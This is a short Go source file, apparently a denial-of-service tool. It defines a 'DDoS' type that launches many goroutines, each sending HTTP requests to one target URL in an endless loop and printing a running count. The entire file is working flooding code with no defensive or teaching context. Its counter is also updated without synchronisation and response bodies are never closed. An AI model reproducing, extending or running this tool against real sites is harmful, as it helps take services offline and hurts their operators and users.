package ddos

import (
	"fmt"
	"io"
	"log"
	"net/http"
)

type RequestConfig struct {
	URL         string
	Method      string
	Headers     map[string]string
	Body        io.Reader
	WorkerCount int
}

type DDoS struct {
	config *RequestConfig
}

var reqCounter int

func New(config *RequestConfig) *DDoS {

	return &DDoS{
		config: config,
	}
}

func (d *DDoS) Start() {

	forever := make(chan struct{})

	for i := 0; i < d.config.WorkerCount; i++ {
		go requestHandler(d)
	}

	<-forever
}

func requestHandler(d *DDoS) {
	for {

		req, err := http.NewRequest(d.config.Method, d.config.URL, d.config.Body)
		if err != nil {
			log.Println(err)
			return
		}

		for key, value := range d.config.Headers {
			req.Header.Set(key, value)
		}

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			log.Println(err)
			continue
		}
		reqCounter++
		fmt.Printf("Request to %s has been made %d times. status: %s \n",
			d.config.URL, reqCounter, resp.Status)

	}
}
